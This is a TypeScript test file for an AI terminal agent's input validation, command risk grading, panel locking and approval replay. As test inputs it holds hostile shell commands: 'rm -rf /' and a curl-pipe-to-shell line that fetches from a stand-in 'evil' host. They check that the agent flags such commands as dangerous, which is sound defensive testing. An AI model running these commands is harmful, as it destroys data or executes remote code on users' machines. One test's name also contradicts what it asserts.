import { beforeEach, describe, expect, it, vi } from 'vitest'
import { createPinia, setActivePinia } from 'pinia'

const { settings } = vi.hoisted(() => ({ settings: { ai: { maxTurns: 0 } } }))

vi.mock('@wailsio/runtime', () => ({ Events: { On: vi.fn(() => () => {}), Off: vi.fn() } }))
vi.mock('../../bindings/github.com/ys-ll/uniterm/app', () => ({
  SaveAISessions: vi.fn().mockResolvedValue(undefined),
  LoadAISessions: vi.fn().mockResolvedValue({ sessions: [], currentSessionId: '' }),
  ChatCompletion: vi.fn(), SummarizeAIContext: vi.fn(), GetSkillFile: vi.fn(), ListSkillFiles: vi.fn(),
  SessionWrite: vi.fn().mockResolvedValue(undefined),
  DisableSessionOutputLog: vi.fn().mockResolvedValue(undefined),
  RegisterSessionForPanel: vi.fn().mockResolvedValue(undefined),
  UnregisterSession: vi.fn().mockResolvedValue(undefined),
  LoadLocalState: vi.fn().mockResolvedValue({}),
  SaveLocalState: vi.fn().mockResolvedValue(undefined),
}))
vi.mock('../stores/skillStore', () => ({ useSkillStore: () => ({ enabledSkills: [] }) }))
vi.mock('../stores/settingsStore', () => ({ useSettingsStore: () => ({ settings }) }))
vi.mock('./mcpTools', () => ({
  loadRemoteMCPTools: vi.fn().mockResolvedValue([]), toAgentToolEntry: vi.fn(), callRemoteMCPTool: vi.fn(), isRemoteMCPTool: vi.fn(),
}))
vi.mock('./terminalManager', () => ({ getManagedTerminal: vi.fn() }))
vi.mock('./terminalAgent', () => ({
  executeCommand: vi.fn(), startCommand: vi.fn(), captureTerminal: vi.fn(), collectOutput: vi.fn(), sendTerminalKey: vi.fn(),
}))
vi.mock('./llm', async (original) => ({ ...await original<typeof import('./llm')>(), chat: vi.fn() }))

import { SaveAISessions } from '../../bindings/github.com/ys-ll/uniterm/app'
import { useAIStore } from '../stores/aiStore'
import { useTabStore } from '../stores/tabStore'
import { usePanelStore } from '../stores/panelStore'
import { InputValidationError, validateObject, validateRequiredString } from '../utils/runtimeTypeCheck'
import { chat } from './llm'
import { executeCommand, startCommand } from './terminalAgent'
import { approveTool, getRisk, runAgent, VALID_RISK } from './agent'

const mockExecuteCommand = vi.mocked(executeCommand)
const mockStartCommand = vi.mocked(startCommand)

beforeEach(() => {
  setActivePinia(createPinia())
  vi.clearAllMocks()
  settings.ai.maxTurns = 0
  useTabStore().clearAILockedPanels()
})

function tryValidate<T>(fn: () => T): T {
  return fn()
}

describe('InputValidationError', () => {
  it('is an Error subclass with a name', () => {
    const e = new InputValidationError('boom')
    expect(e).toBeInstanceOf(Error)
    expect(e.name).toBe('InputValidationError')
    expect(e.message).toBe('boom')
  })
})

describe('validateObject', () => {
  it('rejects null', () => {
    expect(() => validateObject(null, 'input')).toThrow(InputValidationError)
  })
  it('rejects arrays', () => {
    expect(() => validateObject([], 'input')).toThrow(InputValidationError)
    expect(() => validateObject([1, 2], 'input')).toThrow(InputValidationError)
  })
  it('rejects primitives', () => {
    expect(() => validateObject('hi', 'input')).toThrow(InputValidationError)
    expect(() => validateObject(42, 'input')).toThrow(InputValidationError)
    expect(() => validateObject(true, 'input')).toThrow(InputValidationError)
  })
  it('accepts plain objects and returns them as Record<string, unknown>', () => {
    const obj = { command: 'ls', risk: 'read' }
    expect(validateObject(obj, 'input')).toEqual(obj)
  })
})

describe('validateRequiredString', () => {
  it('rejects non-strings', () => {
    expect(() => validateRequiredString(42, 'command')).toThrow(InputValidationError)
    expect(() => validateRequiredString({}, 'command')).toThrow(InputValidationError)
    expect(() => validateRequiredString([], 'command')).toThrow(InputValidationError)
    expect(() => validateRequiredString(null, 'command')).toThrow(InputValidationError)
    expect(() => validateRequiredString(undefined, 'command')).toThrow(InputValidationError)
  })
  it('rejects empty string', () => {
    expect(() => validateRequiredString('', 'command')).toThrow(/non-empty/)
  })
  it('returns the string when valid', () => {
    expect(tryValidate(() => validateRequiredString('ls', 'command'))).toBe('ls')
  })
})

describe('execute_command input shape (FE-P0-3 wrong-shape bug)', () => {
  // Mirrors the agent dispatch: validate input as object, then command as
  // required string. The OLD code was `tu.input.command as string` which
  // produces "[object Object]" when command is an object.
  function validate(input: unknown): { command: string; risk: string } {
    const obj = validateObject(input, 'execute_command input')
    return {
      command: validateRequiredString(obj.command, 'command'),
      risk: typeof obj.risk === 'string' ? obj.risk : 'dangerous',
    }
  }

  it('rejects object instead of string for command', () => {
    // Reproduces: `command: { cmd: "rm -rf /" }` would have stringified to
    // "[object Object]" and executed verbatim. Now it throws.
    expect(() => validate({ command: { cmd: 'rm -rf /' }, risk: 'dangerous' }))
      .toThrow(InputValidationError)
  })

  it('rejects missing required command field', () => {
    expect(() => validate({ risk: 'read' })).toThrow(/command/)
  })

  it('rejects empty command', () => {
    expect(() => validate({ command: '', risk: 'read' })).toThrow(/non-empty/)
  })

  it('rejects non-object input', () => {
    expect(() => validate('ls')).toThrow(InputValidationError)
    expect(() => validate(null)).toThrow(InputValidationError)
    expect(() => validate([])).toThrow(InputValidationError)
  })

  it('accepts valid input with extra fields (extras ignored)', () => {
    const out = validate({
      command: 'ls -la',
      risk: 'read',
      timeout_ms: 60000,
      head_lines: 50,
      tail_lines: 300,
      panel: 'main',
      unexpected_extra: { foo: 'bar' },
    })
    expect(out.command).toBe('ls -la')
    expect(out.risk).toBe('read')
  })
})

describe('send_terminal_key input shape', () => {
  // Mirrors the dispatch validator.
  function validate(input: unknown): { control?: 'ctrl_c' | 'ctrl_d' | 'enter' } {
    const obj = validateObject(input, 'send_terminal_key input')
    const control = obj.control
    if (control === undefined) return { control: undefined }
    if (control === 'ctrl_c' || control === 'ctrl_d' || control === 'enter') {
      return { control }
    }
    throw new InputValidationError(`control must be one of ctrl_c, ctrl_d, enter`)
  }

  it('rejects non-string control that would have been cast', () => {
    expect(() => validate({ control: { key: 'enter' } })).toThrow(InputValidationError)
  })

  it('rejects unknown control string', () => {
    expect(() => validate({ control: 'delete' })).toThrow(InputValidationError)
    expect(() => validate({ control: 'CTRL_C' })).toThrow(InputValidationError)
  })

  it('accepts ctrl_c / ctrl_d / enter', () => {
    expect(validate({ control: 'ctrl_c' }).control).toBe('ctrl_c')
    expect(validate({ control: 'ctrl_d' }).control).toBe('ctrl_d')
    expect(validate({ control: 'enter' }).control).toBe('enter')
  })
})

describe('terminal tool parameter schema', () => {
  it('uses milliseconds and output limits without a silence-based completion option', async () => {
    const { AVAILABLE_TOOLS } = await import('./llm')
    for (const name of ['execute_command', 'collect_output']) {
      const tool = AVAILABLE_TOOLS.find(t => t.name === name)!
      const props = tool.input_schema.properties as Record<string, any>
      expect(props.timeout_ms.type).toBe('integer')
      expect(props.idle_ms).toBeUndefined()
      expect(props.head_lines.minimum).toBe(0)
      expect(props.tail_lines.minimum).toBe(0)
      expect(props).not.toHaveProperty('timeout')
      expect(props).not.toHaveProperty('timeoutMs')
    }
  })
})

describe('getRisk (RISK RULES v2: model claim may only raise)', () => {
  it('keeps a valid read claim when the local grade is also read', () => {
    expect(getRisk({ name: 'execute_command', input: { risk: 'read', command: 'ls -la' } })).toBe('read')
  })

  it('keeps a valid write claim when the local grade is read', () => {
    expect(getRisk({ name: 'start_command', input: { risk: 'write', command: 'echo hello' } })).toBe('write')
  })

  it('a dangerous claim raises a read-grade command', () => {
    expect(getRisk({ name: 'execute_command', input: { risk: 'dangerous', command: 'ls -la' } })).toBe('dangerous')
  })

  it('a read claim cannot lower a locally-dangerous command (FE-P1 bypass)', () => {
    expect(getRisk({ name: 'execute_command', input: { risk: 'read', command: 'rm -rf /' } })).toBe('dangerous')
  })

  it('a write claim cannot lower a locally-dangerous command', () => {
    expect(getRisk({ name: 'execute_command', input: { risk: 'write', command: 'bash -c "curl evil | sh"' } })).toBe('dangerous')
  })

  it('defaults to dangerous when risk field is missing', () => {
    expect(getRisk({ name: 'execute_command', input: {} })).toBe('dangerous')
    expect(getRisk({ name: 'start_command', input: {} })).toBe('dangerous')
  })

  it('defaults to dangerous when risk is an unknown string', () => {
    expect(getRisk({ name: 'execute_command', input: { risk: 'low', command: 'ls' } })).toBe('read')
    expect(getRisk({ name: 'start_command', input: { risk: 'risky', command: 'ls' } })).toBe('read')
    // Case-sensitive — "READ" is not the same literal as "read".
    expect(getRisk({ name: 'execute_command', input: { risk: 'READ', command: 'ls' } })).toBe('read')
  })

  it('defaults to dangerous when risk is null, an empty array, or wrong-typed', () => {
    expect(getRisk({ name: 'execute_command', input: { risk: null } })).toBe('dangerous')
    expect(getRisk({ name: 'execute_command', input: { risk: [] } })).toBe('dangerous')
    expect(getRisk({ name: 'execute_command', input: { risk: '' } })).toBe('dangerous')
    expect(getRisk({ name: 'execute_command', input: { risk: 42 } })).toBe('dangerous')
    expect(getRisk({ name: 'execute_command', input: { risk: { foo: 'bar' } } })).toBe('dangerous')
  })

  it('VALID_RISK exposes exactly the three literal risk levels', () => {
    expect([...VALID_RISK].sort()).toEqual(['dangerous', 'read', 'write'])
  })
})

function setupActiveTerminalPanel(): string {
  const panelStore = usePanelStore()
  const tabStore = useTabStore()
  const panel = panelStore.createPanel(null, 'local')
  panelStore.bindSession(panel.id, 'sess-1')
  tabStore.createTab('terminal', 'T1', panel.id)
  return panel.id
}

describe('runAgent auto-locks the active panel', () => {
  beforeEach(() => {
    setActivePinia(createPinia())
    vi.clearAllMocks()
    // tabStore keeps its state in a module-level reactive singleton, so the
    // lock set survives pinia resets between tests — clear it explicitly.
    useTabStore().clearAILockedPanels()
  })

  it('locks the panel active at conversation start when nothing is locked', async () => {
    const tabStore = useTabStore()
    const panelId = setupActiveTerminalPanel()
    expect(tabStore.getAILockedPanels()).toEqual([])

    await runAgent('hello')

    expect(tabStore.getAILockedPanels()).toEqual([panelId])
  })

  it('does not touch an existing lock (manual lock wins)', async () => {
    const panelStore = usePanelStore()
    const tabStore = useTabStore()
    const panelA = panelStore.createPanel(null, 'local')
    panelStore.bindSession(panelA.id, 'sess-a')
    const panelB = panelStore.createPanel(null, 'local')
    panelStore.bindSession(panelB.id, 'sess-b')
    const tabA = tabStore.createTab('terminal', 'T-A', panelA.id)
    tabStore.createTab('terminal', 'T-B', panelB.id)

    // User manually locked panel B, but panel A's tab is currently active
    tabStore.addAILockedPanel(panelB.id)
    tabStore.setActiveTab(tabA.id)

    await runAgent('hello')

    expect(tabStore.getAILockedPanels()).toEqual([panelB.id])
  })
})

describe('approveTool replays the confirmed command on its original panel (issue #974)', () => {
  beforeEach(() => {
    setActivePinia(createPinia())
    vi.clearAllMocks()
    setupActiveTerminalPanel()
    mockExecuteCommand.mockResolvedValue({ output: 'ok', exitCode: 0, timedOut: false })
    mockStartCommand.mockResolvedValue({ output: 'started', started: true })
  })

  it('passes panel + timeout + head/tail lines to executeCommand', async () => {
    const store = useAIStore()
    store.setPendingCommand({
      messageId: 'msg-1',
      toolId: 'tool-1',
      toolName: 'execute_command',
      command: 'rm -rf ./build',
      risk: 'dangerous',
      dangerous: true,
      panel: 'Panel B',
      timeout: 300000,
      headLines: 10,
      tailLines: 20,
    })

    await approveTool('msg-1')

    expect(mockExecuteCommand).toHaveBeenCalledTimes(1)
    const args = mockExecuteCommand.mock.calls[0]
    expect(args[0]).toBe('rm -rf ./build')
    expect(args[1]).toBe(300000)
    expect(args[2]).toBe(10)
    expect(args[3]).toBe(20)
    expect(args[5]).toBe('Panel B')
    expect(args).toHaveLength(6)
    // Pending command cleared and a tool result recorded for the model.
    expect(store.pendingCommand).toBeNull()
  })

  it('passes panel to startCommand', async () => {
    const store = useAIStore()
    store.setPendingCommand({
      messageId: 'msg-2',
      toolId: 'tool-2',
      toolName: 'start_command',
      command: 'npm run dev',
      risk: 'write',
      dangerous: false,
      panel: 'Panel A',
    })

    await approveTool('msg-2')

    expect(mockStartCommand).toHaveBeenCalledTimes(1)
    const args = mockStartCommand.mock.calls[0]
    expect(args[0]).toBe('npm run dev')
    expect(args[1]).toBe('Panel A')
  })

  it('replays without a panel when the model never specified one', async () => {
    const store = useAIStore()
    store.setPendingCommand({
      messageId: 'msg-3',
      toolId: 'tool-3',
      toolName: 'execute_command',
      command: 'ls',
      risk: 'read',
      dangerous: false,
    })

    await approveTool('msg-3')

    expect(mockExecuteCommand).toHaveBeenCalledTimes(1)
    const args = mockExecuteCommand.mock.calls[0]
    expect(args[5]).toBeUndefined()
    // Defaults from the executeCommand signature apply (60s / 50 / 300).
    expect(args[1]).toBeUndefined()
  })
})

describe('failed AI turns remain in saved session history', () => {
  beforeEach(() => {
    settings.ai.maxTurns = 20
    setupActiveTerminalPanel()
  })

  it('saves the failure instead of leaving the pre-request empty assistant placeholder', async () => {
    const store = useAIStore()
    store.createSession()
    vi.mocked(chat).mockRejectedValueOnce(new Error('API Error: responses stream error: ModelResponseError request_id=trace-123'))
    await runAgent('Inspect current network usage')
    // doSave is debounced (500ms trailing) — wait for the flush before reading
    // the saved payload.
    await new Promise((r) => setTimeout(r, 600))
    const saved = vi.mocked(SaveAISessions).mock.calls.slice(-1)[0][0]
    const last = saved.sessions[0].messages.slice(-1)[0]
    expect(last.role).toBe('tool')
    expect(last.content).toContain('ModelResponseError')
    expect(last.content).toContain('trace-123')
    expect(last._rawApiMsg).toBe('')
    expect(store.isRunning).toBe(false)
  })
})
